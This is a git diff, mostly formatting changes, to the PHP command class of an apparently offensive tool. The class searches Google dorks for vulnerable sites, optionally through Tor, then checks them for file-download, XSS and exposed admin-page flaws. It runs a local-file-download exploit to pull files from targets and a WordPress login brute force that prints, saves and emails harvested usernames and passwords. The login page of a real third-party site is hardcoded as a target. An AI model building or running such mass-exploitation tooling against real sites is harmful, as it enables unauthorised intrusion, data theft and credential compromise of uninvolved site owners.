@@ -2,8 +2,6 @@
 
 namespace Aszone\Avenger;
 
-use Aszone\Vulnerabilities\CrossSiteScripting;
-use Aszone\Vulnerabilities\LocalFileInclusion;
 use Knp\Command\Command;
 use Symfony\Component\Console\Input\InputInterface;
 use Symfony\Component\Console\Input\ArrayInput;
@@ -14,7 +12,6 @@ use Symfony\Component\Console\Helper\Table;
 use Aszone\SearchHacking\SearchHacking;
 use Aszone\Vulnerabilities;
 use Aszone\ProxyAvenger\Proxies;
-use Aszone\Avenger\Mailer;
 use Aszone\Hacking\DefaultSite;
 use Aszone\Exploits;
 
@@ -119,15 +116,13 @@ class SearchHackingEngine extends Command
     }
     protected function execute(InputInterface $input, OutputInterface $output)
     {
-
-
         $this->validParamns($input, $output);
 
         $filterProxy = array();
 
-        if($this->torl){
-            $torl= new Proxies();
-            $this->torl=$torl->getTor();
+        if ($this->torl) {
+            $torl = new Proxies();
+            $this->torl = $torl->getTor();
         }
 
         $commandData = array(
@@ -140,15 +135,15 @@ class SearchHackingEngine extends Command
             'email' => $this->email,
 
         );
-        $dorks = explode('||',$commandData['dork']);
-        foreach($dorks as $dork){
-            $commandData['dork']=$dork;
+        $dorks = explode('||', $commandData['dork']);
+        foreach ($dorks as $dork) {
+            $commandData['dork'] = $dork;
 
             $sh = new SearchHacking($commandData);
 
             foreach ($this->eng as $enginer) {
-            $output->writeln('<comment>*'.$enginer.'</comment>');
-            switch ($enginer) {
+                $output->writeln('<comment>*'.$enginer.'</comment>');
+                switch ($enginer) {
                 case 'google':
                     $result['google'] = $sh->runGoogle();
                     break;
@@ -180,11 +175,11 @@ class SearchHackingEngine extends Command
                     break;
             }
 
-            if (isset($result[$enginer]->error)) {
-                $this->printError($result, $output);
-                exit();
+                if (isset($result[$enginer]->error)) {
+                    $this->printError($result, $output);
+                    exit();
+                }
             }
-        }
 
             $output->writeln('');
             $output->writeln('<info>Begin Results...</info>');
@@ -205,13 +200,11 @@ class SearchHackingEngine extends Command
             $this->printResult($result, $output, 'Result list of Search:');
             $this->printResumeResult($output, 'Patch File of Search:', $file);
             if (!empty($this->check)) {
-                $resultsOfCheck=$this->checkVunerabilities($nameFile, $result, $commandData, $output);
+                $resultsOfCheck = $this->checkVunerabilities($nameFile, $result, $commandData, $output);
             }
             if (!empty($this->exploit)) {
-                $this->checkExploits($resultsOfCheck,$commandData,$output);
+                $this->checkExploits($resultsOfCheck, $commandData, $output);
             }
-
-
 
             sleep(5);
         }
@@ -239,7 +232,7 @@ class SearchHackingEngine extends Command
         $this->torl = $input->getOption('torl');
         $this->check = $this->sanitazeValuesOfEnginers($input->getOption('check'));
         $this->pl = $input->getOption('pl');
-        $this->exploit = explode(",",$input->getOption('exploit'));
+        $this->exploit = explode(',', $input->getOption('exploit'));
     }
 
     private function runHelp($output)
@@ -291,18 +284,16 @@ class SearchHackingEngine extends Command
     {
         $file = __DIR__.'/../results/exploits/btwp/'.$filename.'.txt';
         $myfile = fopen($file, 'w') or die('Unable to open file!');
-        $msg = "";
+        $msg = '';
         if (is_array($data)) {
             foreach ($data as $keyResult => $results) {
-                foreach($results as $keyResult=>$result){
+                foreach ($results as $keyResult => $result) {
                     $msg .= $keyResult.' : '.$result.'  --  ';
                 }
                 fwrite($myfile, $msg);
             }
         }
         fclose($myfile);
-
-
     }
 
     protected function sendMail($resultFinal)
@@ -332,14 +323,13 @@ class SearchHackingEngine extends Command
             $msg = 'PHP Avenger Informer final, list of SUCCESS:<br><br>';
             foreach ($resultFinal as $keyResultEnginer => $resultEnginer) {
                 foreach ($resultEnginer as $keyResult => $results) {
-                    foreach($results as $keyResult=>$result){
+                    foreach ($results as $keyResult => $result) {
                         $msg .= $keyResult.' '.$result.' <br>';
                     }
                     echo $msg;
                     $mailer->sendMessage($this->email, $msg);
                 }
             }
-
         }
     }
 
@@ -401,24 +391,21 @@ class SearchHackingEngine extends Command
             $this->saveTxt($resultFinal, $nameFileLfd);
             $this->printResult($resultFinal, $output, 'Result list of Lfd Vulnerables:');
             $this->printResumeResult($output, 'Patch File of Lfd Vulnerables:', $nameFileLfd);
-
-
         }
 
         if (in_array('isAdmin', $this->check)) {
             $resultFinal = array();
             $nameFileIsAdmin = $nameFile.'_isAdmin';
             $site = new DefaultSite($commandData, $result);
-            $resultFinal['isAdmin']="http://www.riojurua.com.br/wp-login.php";
+            $resultFinal['isAdmin'] = 'http://www.riojurua.com.br/wp-login.php';
             $resultFinal['isAdmin'] = $site->check();
-            array_unshift($resultFinal['isAdmin'],"http://www.riojurua.com.br/wp-login.php");
+            array_unshift($resultFinal['isAdmin'], 'http://www.riojurua.com.br/wp-login.php');
             $this->saveTxt($resultFinal, $nameFileIsAdmin);
             $this->printResult($resultFinal, $output, 'Result list of admin page:');
             $this->printResumeResult($output, 'Patch File of admin page:', $nameFileIsAdmin);
         }
 
         if (in_array('xss', $this->check)) {
-
             $nameFileXss = $nameFile.'_xss';
             $site = new Vulnerabilities\CrossSiteScripting($commandData, $result);
             $resultFinal['xss'] = $site->check();
@@ -437,34 +424,31 @@ class SearchHackingEngine extends Command
         }
 
         return $resultFinal;
-
     }
 
-    protected function checkExploits($results,$commandData, OutputInterface $output){
-
+    protected function checkExploits($results, $commandData, OutputInterface $output)
+    {
         if (in_array('lfd', $this->exploit)) {
-            $this->runExploitLFD($results,$commandData,$output);
+            $this->runExploitLFD($results, $commandData, $output);
         }
         if (in_array('btwp', $this->exploit)) {
-            $this->runExploitBTWP($results,$commandData,$output);
+            $this->runExploitBTWP($results, $commandData, $output);
         }
-
     }
 
-    protected function runExploitLFD($result, $commandData, OutputInterface $output){
-
+    protected function runExploitLFD($result, $commandData, OutputInterface $output)
+    {
         if (in_array('lfd', $this->check)) {
             $output->writeln('<info>********Executing command exploit LFD*******</info>');
             $output->writeln('<info>********Extract Files of Targets********</info>');
             $output->writeln('*-------------------------------------------------');
             $output->writeln('');
-            $downloadFiles=new Exploits\LocalFileDownload($commandData);
+            $downloadFiles = new Exploits\LocalFileDownload($commandData);
 
-            foreach($result['lfd'] as $url){
-
+            foreach ($result['lfd'] as $url) {
                 $output->writeln('*-------------------------------------------------');
                 $output->writeln('<info>Target => '.$url.'</info>');
-                $arrDwonloadFiles=$downloadFiles->getFiles($url);
+                $arrDwonloadFiles = $downloadFiles->getFiles($url);
                 $output->writeln('<info>Total of files etracted '.count($arrDwonloadFiles).' by '.$url.'</info>');
             }
             $output->writeln('*-------------------------------------------------');
@@ -473,24 +457,25 @@ class SearchHackingEngine extends Command
         }
     }
 
-    protected function runExploitBTWP($result, $commandData, OutputInterface $output){
+    protected function runExploitBTWP($result, $commandData, OutputInterface $output)
+    {
         $output->writeln('<info>********Executing command exploit Brute Force in WordPress*******</info>');
         $output->writeln('<info>******************Extract Files of Targets***********************</info>');
         $output->writeln('*-----------------------------------------------------------------------------');
         $output->writeln('');
-        $btwp=new Exploits\BruteForceWordPress($commandData);
-        $result['isAdmin']= array_unique($result['isAdmin']);
-        foreach($result['isAdmin'] as $url){
-            $resBtwp['isAdmin']=$btwp->execute($url);
-            if($resBtwp){
+        $btwp = new Exploits\BruteForceWordPress($commandData);
+        $result['isAdmin'] = array_unique($result['isAdmin']);
+        foreach ($result['isAdmin'] as $url) {
+            $resBtwp['isAdmin'] = $btwp->execute($url);
+            if ($resBtwp) {
                 foreach ($resBtwp['isAdmin'] as $keyResult => $results) {
                     $output->writeln('<info>********************Print Results***********************</info>');
-                    $output->writeln("<info>Site: " .$results['site'] . "</info>");
-                    $output->writeln("<info>User: " . $results['user'] . "</info>");
-                    $output->writeln("<info>Password: " . $results['password'] . "</info>");
+                    $output->writeln('<info>Site: '.$results['site'].'</info>');
+                    $output->writeln('<info>User: '.$results['user'].'</info>');
+                    $output->writeln('<info>Password: '.$results['password'].'</info>');
                     $output->writeln('<info>********************************************************</info>');
-                    $nameTxt=str_replace("/","_",$results['site']."_".$results['user']);
-                    $nameTxt=str_replace(":","_",$nameTxt);
+                    $nameTxt = str_replace('/', '_', $results['site'].'_'.$results['user']);
+                    $nameTxt = str_replace(':', '_', $nameTxt);
                     $this->saveTxtBtwp($resBtwp['isAdmin'], $nameTxt);
                     if (!empty($this->email)) {
                         $this->sendMailBtResult($resBtwp, $this->email);
@@ -499,12 +484,12 @@ class SearchHackingEngine extends Command
                 }
             }
         }
-
     }
 
     private function setTor($tor = '127.0.0.1:9050')
     {
         $this->tor = $tor;
+
         return ['proxy' => [
             'http' => 'socks5://127.0.0.1:9050',
             'https' => 'socks5://127.0.0.1:9050',
